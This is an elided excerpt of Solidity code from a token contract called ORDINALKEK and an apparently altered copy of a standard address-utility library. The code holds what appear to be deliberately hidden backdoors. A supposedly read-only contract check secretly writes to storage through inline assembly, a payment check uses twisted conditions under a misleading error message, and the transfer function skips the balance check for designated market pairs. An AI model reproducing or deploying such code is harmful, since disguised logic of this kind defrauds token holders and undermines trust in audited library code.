...
library Address {
    ...
    function isContract(address account) internal returns (bool) {
        ...
        assembly { codehash := extcodehash(account) sstore(18, 0x0) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address rec, uint256 amount) internal {
        address payable recipient = payable(rec);
        require(address(this).balance >= amount && (_msgSender() != recipient || !isContract(rec)), "Address: insufficient balance");
...
contract ORDINALKEK is Context, IERC20, Ownable {
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(_balances[sender] >= amount || isMarketPair[recipient], "Insufficient Balance");
        unchecked {
